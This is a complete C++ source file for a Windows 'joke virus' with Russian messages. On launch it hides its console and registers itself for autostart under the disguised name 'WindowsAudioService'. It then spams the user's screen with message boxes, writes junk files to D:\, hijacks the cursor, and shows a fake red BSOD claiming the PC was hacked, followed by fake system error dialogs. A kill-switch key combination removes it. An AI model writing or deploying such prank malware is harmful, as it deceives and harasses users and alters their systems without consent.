#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <windowsx.h>
#include <gdiplus.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <string>
#include <vector>
#include <atomic>
#include <fstream>

using namespace Gdiplus;

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdiplus.lib")

static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* kRunName = L"WindowsAudioService";

static std::atomic<bool> g_killSwitch{false};
static std::atomic<bool> g_bsodActive{false};

static Image*    g_cursorImg = nullptr;
static ULONG_PTR g_gdiplusToken = 0;

// ─────────── проверка Wine / Winlator ───────────
static bool IsWine() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;
    return GetProcAddress(ntdll, "wine_get_version") != nullptr;
}

// ─────────── автозапуск ───────────
static bool IsAutoRunInstalled() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    wchar_t buf[MAX_PATH] = {};
    DWORD sz = sizeof(buf), type = 0;
    LONG r = RegQueryValueExW(hKey, kRunName, nullptr, &type, (BYTE*)buf, &sz);
    RegCloseKey(hKey);
    return r == ERROR_SUCCESS;
}

static void InstallAutoRun() {
    wchar_t path[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring quoted = L"\"" + std::wstring(path) + L"\"";
        RegSetValueExW(hKey, kRunName, 0, REG_SZ,
                       (const BYTE*)quoted.c_str(),
                       (DWORD)((quoted.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

static void RemoveAutoRun() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, kRunName);
        RegCloseKey(hKey);
    }
}

// ─────────── kill switch ───────────
static DWORD WINAPI KillSwitchWatcher(LPVOID) {
    int holdMs = 0;
    const int HOLD_REQUIRED = 3000;
    while (!g_killSwitch.load()) {
        bool ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool shift = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
        bool alt   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
        bool q     = (GetAsyncKeyState('Q')        & 0x8000) != 0;
        if (ctrl && shift && alt && q) {
            holdMs += 50;
            if (holdMs >= HOLD_REQUIRED) {
                g_killSwitch.store(true);
                RemoveAutoRun();
                system("taskkill /F /IM cmd.exe /T > nul 2>&1");
                MessageBoxW(nullptr,
                    L"Kill switch сработал.\n\nПрога удалена из автозагрузки.\n"
                    L"Больше не появится.\n\n— Fox",
                    L"Самоуничтожение",
                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
                ExitProcess(0);
            }
        } else { holdMs = 0; }
        Sleep(50);
    }
    return 0;
}

static std::wstring GetExeDir() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring dir(exePath);
    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos) dir = dir.substr(0, pos + 1);
    return dir;
}

// ─────────── файлы на D:\ ───────────
static DWORD WINAPI FileSpammer(LPVOID) {
    std::this_thread::sleep_for(std::chrono::seconds(2));
    if (g_killSwitch.load()) return 0;
    UINT driveType = GetDriveTypeW(L"D:\\");
    if (driveType == DRIVE_NO_ROOT_DIR || driveType == DRIVE_UNKNOWN) return 0;

    const std::wstring content =
        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf"
        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf"
        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf";

    for (int i = 0; i < 10; ++i) {
        if (g_killSwitch.load()) return 0;
        std::wstring filename = (i == 0) ? L"D:\\sanya.txt"
            : L"D:\\sanya_" + std::to_wstring(i) + L".txt";
        std::ofstream f(filename, std::ios::binary | std::ios::trunc);
        if (f.is_open()) {
            std::string utf8;
            for (wchar_t wc : content) {
                if (wc < 0x80) utf8.push_back((char)wc);
                else if (wc < 0x800) {
                    utf8.push_back((char)(0xC0 | (wc >> 6)));
                    utf8.push_back((char)(0x80 | (wc & 0x3F)));
                } else {
                    utf8.push_back((char)(0xE0 | (wc >> 12)));
                    utf8.push_back((char)(0x80 | ((wc >> 6) & 0x3F)));
                    utf8.push_back((char)(0x80 | (wc & 0x3F)));
                }
            }
            f.write(utf8.c_str(), utf8.size());
            f.close();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    return 0;
}

// ─────────── MessageBox-спам ───────────
static const wchar_t* kMessages[] = {
    L"даров Вась ты чё там ты там в порядке вась?",
    L"бро глаголит имбу",
    L"я сын мячика",
    L"я Левандовски",
    L"мой папа Наполеон",
    L"Торт?",
    L"да ладно не суетись ты это прикол",
    L"привет кивро сан",
    L"Меня написал саня, у него выходной",
    L"Окно закроется само. Или нет. Не помню",
};
static constexpr int kMsgCount = _countof(kMessages);

static DWORD WINAPI MsgSpammer(LPVOID) {
    std::srand((unsigned)std::time(nullptr) ^ GetCurrentThreadId());
    for (int i = 0; i < 12; ++i) {
        if (g_killSwitch.load()) return 0;
        if (g_bsodActive.load()) return 0;
        const wchar_t* txt = kMessages[std::rand() % kMsgCount];
        std::thread([txt]() {
            MessageBoxW(nullptr, txt, L"Ой, всё",
                MB_OK | MB_ICONWARNING | MB_TOPMOST);
        }).detach();
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
    return 0;
}

// ─────────── курсор/тап-шлейф ───────────
struct TrailDot { int x, y; ULONGLONG birth; };

static std::vector<TrailDot> g_trail;
static CRITICAL_SECTION     g_trailCs;

static LRESULT CALLBACK TrailWndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    if (msg == WM_MOUSEMOVE || msg == WM_LBUTTONDOWN) {
        int x = GET_X_LPARAM(l), y = GET_Y_LPARAM(l);
        EnterCriticalSection(&g_trailCs);
        TrailDot d; d.x = x; d.y = y; d.birth = GetTickCount64();
        g_trail.push_back(d);
        LeaveCriticalSection(&g_trailCs);
        return 0;
    }
    if (msg == WM_ERASEBKGND) return 1;
    return DefWindowProcW(h, msg, w, l);
}

static DWORD WINAPI CursorTrail(LPVOID) {
    bool wine = IsWine();

    WNDCLASSW wc{};
    wc.lpfnWndProc   = TrailWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = L"JackFoxCursorTrail";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND h = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TOOLWINDOW,
        L"JackFoxCursorTrail", L"",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, wc.hInstance, nullptr);

    SetLayeredWindowAttributes(h, RGB(0, 0, 0), 0, LWA_COLORKEY);
    ShowWindow(h, SW_SHOW);

    while (!g_killSwitch.load()) {
        ULONGLONG now = GetTickCount64();

        // Windows: добавляем точку по позиции курсора
        if (!wine) {
            POINT p;
            if (GetCursorPos(&p)) {
                EnterCriticalSection(&g_trailCs);
                TrailDot d; d.x = p.x; d.y = p.y; d.birth = now;
                g_trail.push_back(d);
                LeaveCriticalSection(&g_trailCs);
            }
        }

        // чистим старые
        EnterCriticalSection(&g_trailCs);
        for (int i = (int)g_trail.size() - 1; i >= 0; i--)
            if (now - g_trail[i].birth > 1200)
                g_trail.erase(g_trail.begin() + i);
        LeaveCriticalSection(&g_trailCs);

        HDC hdc = GetDC(h);
        RECT full = {0, 0, sw, sh};

        // фон чёрный = прозрачный
        HBRUSH blackBr = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &full, blackBr);
        DeleteObject(blackBr);

        if (g_cursorImg) {
            Graphics graphics(hdc);
            EnterCriticalSection(&g_trailCs);
            for (auto& dot : g_trail) {
                ULONGLONG age = now - dot.birth;
                int alpha = 255 - (int)(age * 255 / 1200);
                if (alpha < 0) alpha = 0;

                int w = 48, hh = 48;
                ImageAttributes attrs;
                ColorMatrix cm = {
                    1,0,0,0,0,
                    0,1,0,0,0,
                    0,0,1,0,0,
                    0,0,0,(REAL)alpha/255.0f,0,
                    0,0,0,0,1
                };
                attrs.SetColorMatrix(&cm);
                Rect dest(dot.x - w/2, dot.y - hh/2, w, hh);
                graphics.DrawImage(g_cursorImg, dest,
                    0, 0, g_cursorImg->GetWidth(), g_cursorImg->GetHeight(),
                    UnitPixel, &attrs);
            }
            LeaveCriticalSection(&g_trailCs);
        } else {
            // fallback — квадратики
            EnterCriticalSection(&g_trailCs);
            for (auto& dot : g_trail) {
                ULONGLONG age = now - dot.birth;
                int alpha = 255 - (int)(age * 255 / 1200);
                if (alpha < 0) alpha = 0;
                BYTE v = (BYTE)alpha;
                HBRUSH br = CreateSolidBrush(RGB(v, v/2, v/2));
                int sz = 20;
                RECT r = { dot.x - sz/2, dot.y - sz/2, dot.x + sz/2, dot.y + sz/2 };
                FillRect(hdc, &r, br);
                DeleteObject(br);
            }
            LeaveCriticalSection(&g_trailCs);
        }

        ReleaseDC(h, hdc);
        Sleep(20);
    }

    DestroyWindow(h);
    return 0;
}

static DWORD WINAPI CursorDancer(LPVOID) {
    POINT start{};
    GetCursorPos(&start);
    const double ampX = 220.0, ampY = 160.0;
    const auto t0 = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
               std::chrono::steady_clock::now() - t0).count() < 3) {
        if (g_killSwitch.load()) return 0;
        const double t = std::chrono::duration<double>(
            std::chrono::steady_clock::now() - t0).count();
        int x = start.x + (int)(ampX * std::sin(t * 1.1));
        int y = start.y + (int)(ampY * std::sin(t * 1.9));
        SetCursorPos(x, y);
        std::this_thread::sleep_for(std::chrono::milliseconds(12));
    }
    return 0;
}

// ─────────── красный BSOD ───────────
struct BsodState { int percent = 0; };
static BsodState g_bsodState;

static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        const int W = rc.right, H = rc.bottom;

        HBRUSH bg = CreateSolidBrush(RGB(140, 0, 0));
        FillRect(dc, &rc, bg); DeleteObject(bg);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 255, 255));

        HFONT fFace = CreateFontW(-110, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        HGDIOBJ old = SelectObject(dc, fFace);
        RECT rf{0, (int)(H * 0.05), W, (int)(H * 0.05) + 140};
        DrawTextW(dc, L":)", -1, &rf, DT_CENTER | DT_SINGLELINE);

        HFONT fBig = CreateFontW(-30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        SelectObject(dc, fBig);
        RECT rt{60, (int)(H * 0.28), W - 60, H};
        const wchar_t* body =
            L"Твой ПК столкнулся с проблемой и будет перезагружен.\n"
            L"Сбор информации о проблеме...\n\n"
            L"Код ошибки: SANCHES_HAX_0xDEADPISKA\n"
            L"Виновник: Sanchez\n"
            L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
            L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n"
            L"— Jack & Fox";
        DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);

        const int barY = (int)(H * 0.72), barX = 60, barW = W - 120, barH = 40;
        HPEN penWhite = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
        HGDIOBJ oldPen = SelectObject(dc, penWhite);
        HGDIOBJ oldBrush = SelectObject(dc, GetStockObject(NULL_BRUSH));
        Rectangle(dc, barX, barY, barX + barW, barY + barH);

        if (g_bsodState.percent > 0) {
            int fillW = (int)((double)barW * g_bsodState.percent / 100.0);
            RECT fill{barX + 1, barY + 1, barX + fillW, barY + barH - 1};
            HBRUSH fillBr = CreateSolidBrush(RGB(255, 80, 80));
            FillRect(dc, &fill, fillBr); DeleteObject(fillBr);
        }
        SelectObject(dc, oldPen); SelectObject(dc, oldBrush);
        DeleteObject(penWhite);

        HFONT fPercent = CreateFontW(-40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fPercent);
        SetTextColor(dc, RGB(255, 255, 255));
        wchar_t pctBuf[16];
        wsprintfW(pctBuf, L"%d%%", g_bsodState.percent);
        RECT rp{barX, barY + barH + 10, barX + 200, barY + barH + 70};
        DrawTextW(dc, pctBuf, -1, &rp, DT_LEFT | DT_SINGLELINE);

        SelectObject(dc, old);
        DeleteObject(fFace); DeleteObject(fBig); DeleteObject(fPercent);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProcW(h, m, w, l);
}

static void RunBsod() {
    g_bsodActive.store(true);
    WNDCLASSW wc{};
    wc.lpfnWndProc   = BsodWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = L"JackFoxRedBsod";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(WS_EX_TOPMOST, L"JackFoxRedBsod", L"",
        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(h, SW_SHOW); UpdateWindow(h); SetForegroundWindow(h);

    struct Step { int pct; int ms; };
    const Step steps[] = {
        { 1, 500 }, { 7, 1000 }, { 9, 1500 }, { 18, 2000 },
        { 34, 3000 }, { 56, 3000 }
    };
    for (auto& s : steps) {
        if (g_killSwitch.load()) { DestroyWindow(h); return; }
        g_bsodState.percent = s.pct;
        InvalidateRect(h, nullptr, TRUE); UpdateWindow(h);
        std::this_thread::sleep_for(std::chrono::milliseconds(s.ms));
    }
    for (int i = 0; i < 40; ++i) {
        if (g_killSwitch.load()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    DestroyWindow(h);
    g_bsodActive.store(false);
}

// ─────────── радуга ───────────
static void HsvToRgb(double h, double s, double v, BYTE& r, BYTE& g, BYTE& b) {
    double c = v * s;
    double x = c * (1 - fabs(fmod(h / 60.0, 2.0) - 1));
    double m = v - c;
    double rp = 0, gp = 0, bp = 0;
    if (h < 60) { rp = c; gp = x; bp = 0; }
    else if (h < 120) { rp = x; gp = c; bp = 0; }
    else if (h < 180) { rp = 0; gp = c; bp = x; }
    else if (h < 240) { rp = 0; gp = x; bp = c; }
    else if (h < 300) { rp = x; gp = 0; bp = c; }
    else { rp = c; gp = 0; bp = x; }
    r = (BYTE)((rp + m) * 255); g = (BYTE)((gp + m) * 255); b = (BYTE)((bp + m) * 255);
}

static DWORD WINAPI RainbowScreen(LPVOID) {
    WNDCLASSW wc{};
    wc.lpfnWndProc   = DefWindowProcW;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = L"JackFoxRainbow";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(WS_EX_TOPMOST, L"JackFoxRainbow", L"",
        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(h, SW_SHOW); UpdateWindow(h); SetForegroundWindow(h);

    HDC hdc = GetDC(h);
    double hue = 0.0;
    auto t0 = std::chrono::steady_clock::now();
    while (!g_killSwitch.load()) {
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - t0).count();
        if (elapsed >= 10000) break;
        BYTE r, g, b;
        HsvToRgb(hue, 1.0, 1.0, r, g, b);
        RECT full{0, 0, sw, sh};
        HBRUSH br = CreateSolidBrush(RGB(r, g, b));
        FillRect(hdc, &full, br); DeleteObject(br);
        hue += 2.0;
        if (hue >= 360.0) hue -= 360.0;
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
    ReleaseDC(h, hdc); DestroyWindow(h);
    return 0;
}

// ─────────── системные ошибки ───────────
static const wchar_t* kErrors[] = {
    L"SYSTEM ERROR\n\nCritical process died.\nError code: 0x000000F4",
    L"SYSTEM ERROR\n\nKernel panic — not syncing: Fatal exception.\nError code: 0x0000007E",
    L"SYSTEM ERROR\n\nMemory management error.\nError code: 0x0000001A",
    L"SYSTEM ERROR\n\nBad system config info.\nError code: 0x00000074",
    L"SYSTEM ERROR\n\nUnexpected kernel mode trap.\nError code: 0x0000007F",
    L"SYSTEM ERROR\n\nNTFS file system error.\nError code: 0x00000024",
    L"SYSTEM ERROR\n\nPage fault in nonpaged area.\nError code: 0x00000050",
    L"SYSTEM ERROR\n\nDriver IRQL not less or equal.\nError code: 0x000000D1",
    L"SYSTEM ERROR\n\nSystem service exception.\nError code: 0x0000003B",
    L"SYSTEM ERROR\n\nIRQL_NOT_LESS_OR_EQUAL.\nError code: 0x0000000A",
};
static constexpr int kErrorCount = _countof(kErrors);

static void ShowSystemErrors() {
    for (int i = 0; i < kErrorCount; ++i) {
        if (g_killSwitch.load()) return;
        MessageBoxW(nullptr, kErrors[i], L"System Error",
            MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SETFOREGROUND);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}

static DWORD WINAPI MainLoop(LPVOID) {
    std::this_thread::sleep_for(std::chrono::seconds(5));
    if (g_killSwitch.load()) return 0;

    RunBsod();
    if (g_killSwitch.load()) return 0;
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    HANDLE hRainbow = CreateThread(nullptr, 0, RainbowScreen, nullptr, 0, nullptr);
    WaitForSingleObject(hRainbow, INFINITE);
    CloseHandle(hRainbow);
    if (g_killSwitch.load()) return 0;

    MessageBoxW(nullptr,
        L"Сори брат.\n\nЭто была шутка. Ничего не удалено.\n"
        L"Ты поверил? :)\n\nХАХАХАХАХАХАХАХА\n\n— Jack & Fox",
        L"ХАХАХАХАХА", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    if (g_killSwitch.load()) return 0;

    ShowSystemErrors();
    if (g_killSwitch.load()) return 0;

    MessageBoxW(nullptr,
        L"Всё, брат, ты досмотрел до конца.\n\n"
        L"Комп не выключится. Это тоже шутка.\n"
        L"Если хочешь убить прогу навсегда —\n"
        L"зажми Ctrl+Shift+Alt+Q на 3 секунды.\n\n— Jack & Fox",
        L"Пока-пока", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    return 0;
}

int main() {
    HANDLE hMutex = CreateMutexW(nullptr, TRUE, L"Global\\JackFoxJokeVirus");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    if (HWND c = GetConsoleWindow()) ShowWindow(c, SW_HIDE);

    // GDI+ init
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, nullptr);

    // загрузка картинки 
    std::wstring cursorPath = GetExeDir() + L"cursor.png";
    g_cursorImg = Image::FromFile(cursorPath.c_str());

    InitializeCriticalSection(&g_trailCs);
    if (!IsAutoRunInstalled()) InstallAutoRun();

    CreateThread(nullptr, 0, KillSwitchWatcher, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, FileSpammer,       nullptr, 0, nullptr);
    CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
    CreateThread(nullptr, 0, CursorTrail,       nullptr, 0, nullptr);
    CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
    CreateThread(nullptr, 0, MainLoop,          nullptr, 0, nullptr);

    Sleep(INFINITE);
    return 0;
}
